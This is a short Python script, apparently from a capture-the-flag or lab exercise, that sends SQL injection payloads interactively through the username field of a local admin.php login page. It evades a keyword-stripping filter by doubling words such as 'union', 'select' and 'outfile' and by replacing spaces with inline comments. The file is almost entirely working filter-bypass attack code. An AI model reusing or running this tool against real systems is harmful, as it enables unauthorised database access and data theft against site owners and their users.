import requests

blacklist = {
    'union': 'uunionnion',
    'select': 'sselectelect',
    'or': 'oorr',
    'from': 'ffromrom',
    'where': 'wwherehere',
    'outfile': 'ooutfileutfile'
}

def modify(payload):
    inp = payload.split()
    for i in range(len(inp)):
        for key, value in blacklist.items():
            if inp[i] == key:
                inp[i] = value

    payload = " ".join(inp)
    generated = payload.replace(" ", "/*a*/")
    return generated

url = "http://localhost:9999/admin.php"

while True:
    inp = input("prompt> ")
    if inp != 'q':
        payload = modify(inp)

        data = {
            "username": payload,
            "password": "test" 
        }
        
        proxy = {
            "http": "http://127.0.0.1:8080"
        }

        response = requests.post(url, data=data)
        print(response.text[3211:3424])
    else:
        exit()
